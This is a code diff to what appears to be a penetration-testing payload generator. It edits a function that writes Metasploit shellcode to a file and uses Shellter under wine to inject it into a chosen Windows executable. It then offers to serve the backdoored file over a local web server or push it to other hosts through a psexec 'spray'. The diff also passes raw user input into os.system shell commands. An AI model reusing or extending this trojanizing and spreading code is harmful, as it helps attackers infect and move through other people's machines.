@@ -55,33 +55,20 @@ def askAndReturnModules(shellcode, metasploit_type):
 
     return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
-def Shellter(shellcode):
-    payloadinexe_payloadname = raw_input(
-        t.bold_green + '[*] EXE Filepath or URL to EXE: ' + t.normal)
+def Shellter(ez2read_shellcode):
+    payloadinexe_payloaddir = raw_input(
+        t.bold_green + '[*] EXE Full Filepath: ' + t.normal)
     os.chdir(os.getcwd() + '/shellter')
-    try:
-        os.mkdir('compiled')
-    except:
-        pass
     with open('payloadbin', 'wb') as Csave:
-        Csave.write(shellcode)
+        Csave.write(ez2read_shellcode)
         Csave.close()
-    payloadinexe_payloadnameshort = re.search(
-        '\w+\.exe$', payloadinexe_payloadname)
-    if re.search('(http:\/\/|https:\/\/)', payloadinexe_payloadname):
-        os.system('wget ' + payloadinexe_payloadname)
-        payloadinexe_payloadname = payloadinexe_payloadnameshort.group(0)
     os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
-              payloadinexe_payloadname)
-    os.system('mv %s ./compiled/%s' %
-              (payloadinexe_payloadname, payloadinexe_payloadnameshort.group(0)))
-    try:
-        os.system('rm ' + payloadinexe_payloadnameshort.group(0))
-        os.system('rm ' + payloadinexe_payloadnameshort.group(0) + '.bak')
-        os.system('rm payloadbin')
-    except:
-        pass
-    DoPayloadShellterUpload(payloadinexe_payloadnameshort.group(0))
+              payloadinexe_payloaddir)
+    os.system('mv %s %s'%(payloadinexe_payloaddir, payloaddir))
+    os.remove(payloadinexe_payloaddir + '.bak')
+    os.remove('payloadbin')
+    payloadinexe_payloadname = payloadinexe_payloaddir.split('/')[-1]
+    DoPayloadUpload(payloadinexe_payloadname.replace('.exe',''))
 
 
 def GeneratePayload(ez2read_shellcode,payloadname):
@@ -126,11 +113,7 @@ def CleanUpPayloadMess(payloadname):
 def DoPayloadUpload(payloadname):
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
-    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir)
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         DoPsexecSpray(payloaddir + '/' + payloadname)
-
-def DoPayloadShellterUpload(payloadname):
-    want_to_upload = raw_input(
-        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
-    FUNCTIONS().DoServeShellter(FUNCTIONS().CheckInternet(), payloadname)
+    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
+        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir)
